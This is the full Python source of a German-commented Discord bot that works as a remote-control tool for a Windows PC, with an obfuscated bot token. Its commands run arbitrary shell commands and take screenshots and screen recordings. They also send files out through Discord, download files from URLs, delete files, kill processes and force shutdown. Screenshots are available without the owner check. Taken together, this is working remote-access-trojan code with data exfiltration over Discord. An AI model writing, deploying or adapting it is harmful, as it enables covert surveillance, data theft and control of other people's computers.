import discord
from discord.ext import commands, tasks
import os
import requests
import subprocess
import logging
import psutil
import pyautogui
import socket  # Für den PC-Namen
import datetime  # Für Datum und Uhrzeit
from io import BytesIO
import ctypes
import random
import numpy as np
import base64
import mss
import cv2
import time


# Logging Setup
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')

# Verschlüsselung 
def xor_decrypt(data: bytes, key: int) -> str:
    return ''.join(chr(b ^ key) for b in data)

ENCODED_TOKEN = "WkNaJVp9cCdZbVYnWVNSYFhTUiVaQ1ZuWUY5UG91YVMjOUV8L29yTX5afF57byEmXF1mfXVxQUFIXnRfeCNzc2FhdXZbcE9S"
KEY = 23

decoded_bytes = base64.b64decode(ENCODED_TOKEN)
TOKEN = xor_decrypt(decoded_bytes, KEY)
OWNER_ID = 1362819243086843934
STATUS_CHANNEL_ID = 1366362190155616277

# Discord Intents (erlaubt Status-Abfragen & Userdaten)
intents = discord.Intents.default()
intents.members = True
intents.presences = True
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)  # Slash Commands verwenden

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    # ❌ Reagiere nicht auf DMs
    if message.guild is None:
        return

    await bot.process_commands(message)


# Hilfe-Command
@bot.command()
async def help(ctx):
    help_text = """
    **Verfügbare Commands:**

    **!shutdown** - Fährt den PC herunter.
    **!screenshot** - Macht einen Screenshot und sendet ihn.
    **!cd [Pfad]** - Wechselt das Verzeichnis auf den angegebenen Pfad.
    **!download [URL]** - Lädt eine Datei von einer URL herunter.
    **!upload [Dateipfad]** - Lädt eine Datei vom PC und sendet sie.
    **!current** - Zeigt den aktuellen Arbeitsverzeichnis-Pfad an.
    **!getip** - Zeigt die öffentliche IP-Adresse des PCs an.
    **!kill [PID]** - Beendet einen Prozess mit der angegebenen PID.
    **!tasklist** - Zeigt eine Liste von laufenden Prozessen an.
    **!execute [Befehl]** - Führt den angegebenen Befehl im CMD aus.
    **!delete [Ordner]** - Löscht den angegebenen Ordner.
    **!rename [Datei]** - Nennt die angegebene Datei um.
    **!find [Datei]** - Sucht die angegebene Datei auf dem Pc.
    **!clear [Zahl]** - Löscht die letzten Nachrichten
    **!roll** - Ja / Nein | Ist eigentlich so wie Kopf oder Zahl
    **Hinweis:** Alle Commands sind nur für den Besitzer des Bots verfügbar.
    """
    await ctx.send(help_text)



# Command: !find
@bot.command()
async def find(ctx, filename: str):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        logging.warning(f"Unberechtigter Zugriff von {ctx.author}")
        return

    await ctx.send(f"🔍 Suche nach der Datei: {filename}...")
    logging.info(f"Suche nach Datei: {filename}")

    found_files = []
    # Überprüfe das gesamte Dateisystem oder einen bestimmten Ordner
    for root, dirs, files in os.walk("C:/"):  # Startet im C:/ Verzeichnis
        if filename in files:
            found_files.append(os.path.join(root, filename))  # Pfad zur Datei hinzufügen

    # Ergebnisse zurücksenden
    if found_files:
        file_list = "\n".join(found_files)  # Liste der gefundenen Dateien
        await ctx.send(f"✅ Gefundene Dateien:\n{file_list}")
        logging.info(f"Dateien gefunden: {len(found_files)}")
    else:
        await ctx.send("❌ Keine Dateien gefunden.")
        logging.info("Keine Dateien gefunden.")

# Command: !clear
@bot.command()
async def clear(ctx, amount: int):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        logging.warning(f"Unberechtigter Zugriff von {ctx.author}")
        return

    # Sicherstellen, dass die angegebene Anzahl positiv und im akzeptablen Bereich liegt
    if amount < 1 or amount > 100:
        await ctx.send("❌ Die Anzahl muss zwischen 1 und 100 liegen!")
        return

    deleted = await ctx.channel.purge(limit=amount)
    await ctx.send(f"✅ {len(deleted)} Nachrichten wurden gelöscht!", delete_after=3)
    logging.info(f"{len(deleted)} Nachrichten im Channel {ctx.channel.name} gelöscht.")

# Command: !shutdown
@bot.command()
async def shutdown(ctx):
     if ctx.author.id != OWNER_ID:
         await ctx.send("❌ Keine Berechtigung!")
         logging.warning(f"Unberechtigter Zugriff von {ctx.author}")
         return

     await ctx.send("🛑 PC wird heruntergefahren!")
     logging.info("PC wird heruntergefahren...")

     subprocess.call(["shutdown", "/s", "/f", "/t", "1"])

# Command: !current
@bot.command()
async def current(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        logging.warning(f"Unberechtigter Zugriff von {ctx.author}")
        return

    current_dir = os.getcwd()
    await ctx.send(f"📂 Aktuelles Arbeitsverzeichnis:\n`{current_dir}`")
    logging.info(f"Aktuelles Arbeitsverzeichnis abgefragt: {current_dir}")

@bot.command()
async def recordscreen(ctx, dauer: int = 10):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        return

    await ctx.send(f"🖥️ Bildschirmaufnahme gestartet für {dauer} Sekunden...")

    timestamp = time.strftime("%Y%m%d-%H%M%S")
    filename = f"recording_{timestamp}.mp4"

    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Ersten Bildschirm auswählen
        width = monitor["width"]
        height = monitor["height"]

        fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # MP4-Codec
        out = cv2.VideoWriter(filename, fourcc, 20.0, (width, height))

        start_time = time.time()
        while time.time() - start_time < dauer:
            img = sct.grab(monitor)
            frame = cv2.cvtColor(cv2.UMat(np.array(img)), cv2.COLOR_BGRA2BGR)
            out.write(frame.get())
        
        out.release()

    await ctx.send(f"✅ Aufnahme beendet! Datei: `{filename}`", file=discord.File(filename))
    os.remove(filename)  # Löscht die Datei nach dem Senden

@bot.command()
async def status(ctx):
    # PC-Name ermitteln
    pc_name = socket.gethostname()  # Erhalte den Hostnamen des PCs
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Aktuelles Datum und Uhrzeit
    if psutil.pid_exists(os.getpid()):
        status_text = f"✅ **{pc_name}** ist online."
        color = discord.Color.green()
    else:
        status_text = f"❌ **{pc_name}** ist offline."
        color = discord.Color.red()

    embed = discord.Embed(
        title="💻 PC-Status",
        description=status_text,
        color=color
    )
    embed.add_field(name="PC-Name", value=pc_name, inline=False)
    embed.add_field(name="Aktuelles Datum und Uhrzeit", value=current_time, inline=False)
    embed.set_footer(text="Bot von yx")  # Optional: Ein Footer mit deinem Namen
    
    await ctx.send(embed=embed)
    logging.info(f"Status gesendet: {status_text}")

# Command: !tasklist
@bot.command()
async def tasklist(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        logging.warning(f"Unberechtigter Zugriff von {ctx.author}")
        return

    # Liste der laufenden Prozesse abrufen
    process_list = []
    for proc in psutil.process_iter(['pid', 'name']):
        process_list.append(f"PID: {proc.info['pid']} - Name: {proc.info['name']}")

    # Liste der Prozesse anzeigen
    embed = discord.Embed(
        title="🔎 Laufende Prozesse",
        description="\n".join(process_list[:20]),  # Zeige die ersten 20 Prozesse an
        color=discord.Color.orange()
    )
    await ctx.send(embed=embed)
    logging.info(f"Liste der Prozesse gesendet.")

# Command: !kill
@bot.command()
async def kill(ctx, pid: int):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        logging.warning(f"Unberechtigter Zugriff von {ctx.author}")
        return
    
    try:
        # Prozess anhand der PID stoppen
        process = psutil.Process(pid)
        process.terminate()  # Prozess beenden
        await ctx.send(f"✅ Prozess mit PID {pid} wurde erfolgreich beendet.")
        logging.info(f"Prozess mit PID {pid} beendet.")
    except psutil.NoSuchProcess:
        await ctx.send(f"❌ Kein Prozess mit PID {pid} gefunden.")
        logging.warning(f"Prozess mit PID {pid} nicht gefunden.")
    except psutil.AccessDenied:
        await ctx.send(f"❌ Zugriff auf Prozess mit PID {pid} verweigert.")
        logging.warning(f"Zugriff auf Prozess mit PID {pid} verweigert.")
    except Exception as e:
        await ctx.send(f"❌ Fehler beim Beenden des Prozesses: {str(e)}")
        logging.error(f"Fehler beim Beenden des Prozesses: {str(e)}")

# Command: !list
@bot.command()
async def list(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        return

    files = os.listdir()
    if not files:
        await ctx.send("📂 Das Verzeichnis ist leer.")
        return

    file_list = "\n".join(files[:50])  # Maximal 50 Dateien auflisten
    embed = discord.Embed(
        title="📄 Dateien und Ordner",
        description=file_list,
        color=discord.Color.blurple()
    )
    await ctx.send(embed=embed)

# Command: !execute (powershell)
@bot.command()
async def execute(ctx, *, command: str):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        return

    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=30)
        if len(result) > 1900:
            result = result[:1900] + "\n...[Ausgabe gekürzt]"
        await ctx.send(f"```{result}```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"❌ Fehler:\n```{e.output}```")
    except subprocess.TimeoutExpired:
        await ctx.send(f"❌ Der Befehl hat zu lange gebraucht und wurde abgebrochen.")


# Command: !rename
@bot.command()
async def rename(ctx, old_name: str, new_name: str):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        return

    if os.path.exists(old_name):
        try:
            os.rename(old_name, new_name)
            await ctx.send(f"✅ **{old_name}** wurde in **{new_name}** umbenannt.")
        except Exception as e:
            await ctx.send(f"❌ Fehler beim Umbenennen: {e}")
    else:
        await ctx.send(f"❌ Datei oder Ordner **{old_name}** nicht gefunden.")


# Command: !delete
@bot.command()
async def delete(ctx, *, filename: str):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        return

    if os.path.exists(filename):
        try:
            os.remove(filename)
            await ctx.send(f"✅ Datei **{filename}** wurde gelöscht.")
        except Exception as e:
            await ctx.send(f"❌ Fehler beim Löschen: {e}")
    else:
        await ctx.send(f"❌ Datei **{filename}** nicht gefunden.")


# Command: !upload
@bot.command()
async def upload(ctx, *, file_path: str):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        logging.warning(f"Unberechtigter Zugriff von {ctx.author}")
        return

    # Datei hochladen
    if os.path.exists(file_path):
        await ctx.send(f"📤 Datei wird hochgeladen: {file_path}")
        logging.info(f"Datei wird hochgeladen: {file_path}")
        
        await ctx.send(file=discord.File(file_path))
        logging.info(f"Datei {file_path} erfolgreich hochgeladen.")
    else:
        await ctx.send(f"❌ Datei nicht gefunden: {file_path}")
        logging.error(f"Datei nicht gefunden: {file_path}")

# Command: !download
@bot.command()
async def download(ctx, url: str):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        logging.warning(f"Unberechtigter Zugriff von {ctx.author}")
        return

    # Download der Datei
    try:
        file_name = url.split("/")[-1]  # Name der Datei aus der URL extrahieren
        await ctx.send(f"🔽 Datei wird heruntergeladen: {file_name}")
        logging.info(f"Starte Download von: {url}")

        # Datei herunterladen
        response = requests.get(url)
        with open(file_name, 'wb') as f:
            f.write(response.content)

        await ctx.send(f"✅ Datei {file_name} wurde erfolgreich heruntergeladen!")
        await ctx.send(file=discord.File(file_name))
        logging.info(f"Datei {file_name} erfolgreich heruntergeladen und gesendet.")
    except Exception as e:
        await ctx.send(f"❌ Fehler beim Download: {e}")
        logging.error(f"Fehler beim Download: {e}")

# Command: !cd
@bot.command()
async def cd(ctx, *, path: str):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        logging.warning(f"Unberechtigter Zugriff von {ctx.author}")
        return

    # Versuchen, das Arbeitsverzeichnis zu wechseln
    try:    
        os.chdir(path)
        await ctx.send(f"✅ Verzeichnis gewechselt zu: {os.getcwd()}")
        logging.info(f"Verzeichnis gewechselt zu: {os.getcwd()}")
    except Exception as e:
        await ctx.send(f"❌ Fehler: {e}")
        logging.error(f"Fehler beim Wechseln des Verzeichnisses: {e}")

# Command: !roll
@bot.command()
async def roll(ctx):
    # Definiere die möglichen Ergebnisse (7x "Ja" und 3x "Nein")
    outcomes = ['Ja'] * 7 + ['Nein'] * 3
    
    # Roll die "Los"-Wahl
    result = random.choice(outcomes)

    # Sende das Ergebnis
    await ctx.send(f"Ja oder Nein?: **{result}**")

# Command: !screenshot
@bot.command()
async def screenshot(ctx):
    await ctx.send("📸 Screenshot wird gemacht...")
    logging.info("Screenshot wird gemacht...")

    # Screenshot erstellen ohne ihn zu speichern
    screenshot = pyautogui.screenshot()
    byte_io = BytesIO()
    screenshot.save(byte_io, format="PNG")
    byte_io.seek(0)

    embed = discord.Embed(
        title="📸 Screenshot",
        description="Hier ist der Screenshot!",
        color=discord.Color.blue()
    )
    embed.set_image(url="attachment://screenshot.png")  # Setzt das Bild im Embed
    await ctx.send(embed=embed, file=discord.File(byte_io, filename="screenshot.png"))
    logging.info("Screenshot gesendet!")

# Command: !getip
@bot.command()
async def getip(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Keine Berechtigung!")
        logging.warning(f"Unberechtigter Zugriff von {ctx.author}")
        return
    
    # PC-Name und aktuelle Uhrzeit
    pc_name = socket.gethostname()
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Öffentliche IP abfragen
    ip = requests.get('https://api.ipify.org').text
    embed = discord.Embed(
        title="🌐 Öffentliche IP-Adresse",
        description=f"Deine öffentliche IP-Adresse ist: **{ip}**",
        color=discord.Color.green()
    )
    embed.add_field(name="PC-Name", value=pc_name, inline=False)
    embed.add_field(name="Aktuelles Datum und Uhrzeit", value=current_time, inline=False)
    embed.set_footer(text="Bot von yx")

    await ctx.send(embed=embed)
    logging.info(f"Öffentliche IP-Adresse: {ip}")

# Bot starten
bot.run(TOKEN)
